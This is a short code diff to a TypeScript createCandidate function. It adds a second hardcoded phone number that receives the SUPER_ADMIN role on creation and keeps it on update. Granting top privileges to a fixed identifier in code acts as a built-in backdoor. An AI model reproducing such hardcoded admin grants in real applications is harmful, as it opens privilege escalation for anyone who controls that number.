@@ -105,13 +105,13 @@ export async function createCandidate(data: {
       update: {
         name: data.name,
         password: hashedPassword,
-        ...(cleanPhone !== "9999999999" ? { role: "CANDIDATE_ADMIN" } : {}),
+        ...(cleanPhone !== "9999999999" && cleanPhone !== "9664074969" ? { role: "CANDIDATE_ADMIN" } : {}),
       },
       create: {
         name: data.name,
         phone: cleanPhone,
         password: hashedPassword,
-        role: cleanPhone === "9999999999" ? "SUPER_ADMIN" : "CANDIDATE_ADMIN",
+        role: cleanPhone === "9999999999" || cleanPhone === "9664074969" ? "SUPER_ADMIN" : "CANDIDATE_ADMIN",
       },
     });
 
